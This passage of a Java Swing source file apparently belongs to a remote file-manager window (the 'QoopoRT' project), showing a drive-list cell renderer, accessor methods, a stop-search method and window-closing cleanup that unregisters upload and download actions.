            setVerticalAlignment(CENTER);
        }

        /*
         * This method finds the image and text corresponding
         * to the selected value and returns the label, set up
         * to display the text and image.
         */
        @Override
        public Component getListCellRendererComponent(
                JList list,
                Object value,
                int index,
                boolean isSelected,
                boolean cellHasFocus) {
            try {
                int selectedIndex = ((Integer) value).intValue();
                if (isSelected) {
                    setBackground(list.getSelectionBackground());
                    setForeground(list.getSelectionForeground());
                } else {
                    setBackground(list.getBackground());
                    setForeground(list.getForeground());
                }
                //Set the icon and text.  If icon was null, say so.
                ImageIcon icon = unidadesLocales[selectedIndex];
                String texto = unidadesLocales[selectedIndex].getDescription();
                setIcon(icon);
                if (icon != null) {
                    setText(texto);
//                setFont(list.getFont());
                } else {
                    setText("");
                }
            } catch (Exception e) {
//                e.printStackTrace();
            }
            return this;
        }
    }

    public ImageIcon[] getUnidades() {
        return unidadesRemotas;
    }

    public void setUnidades(ImageIcon[] unidades) {
        this.unidadesRemotas = unidades;
    }

    public JLabel getVistaPrevia() {
        return vistaPreviaRemoto;
    }

    public void setVistaPrevia(JLabel vistaPrevia) {
        this.vistaPreviaRemoto = vistaPrevia;
    }

    public DefaultTableModel getModelotablaResultados() {
        return modelotablaResultados;
    }

    public void setModelotablaResultados(DefaultTableModel modelotablaResultados) {
        this.modelotablaResultados = modelotablaResultados;
    }

    public void detenerBusqueda() {
        btnBuscar.setSelected(false);
        btnBuscar.setIcon(Util.cargarIcono16("/resources/find.png"));
        servidor.detenerBusqueda();
    }

    @Override
    public void windowOpened(WindowEvent e) {
    }

    @Override
    public void windowClosing(WindowEvent e) {
        QoopoRT.eliminarAccionCarga(accionListarRemoto);
        QoopoRT.eliminarAccionDescarga(accionListarLocal);
        servidor.cerrarArchivos();
    }

    @Override
    public void windowClosed(WindowEvent e) {
    }

    @Override
    public void windowIconified(WindowEvent e) {
    }

    @Override
    public void windowDeiconified(WindowEvent e) {
    }

    @Override
    public void windowActivated(WindowEvent e) {
    }

    @Override
    public void windowDeactivated(WindowEvent e) {
    }

}
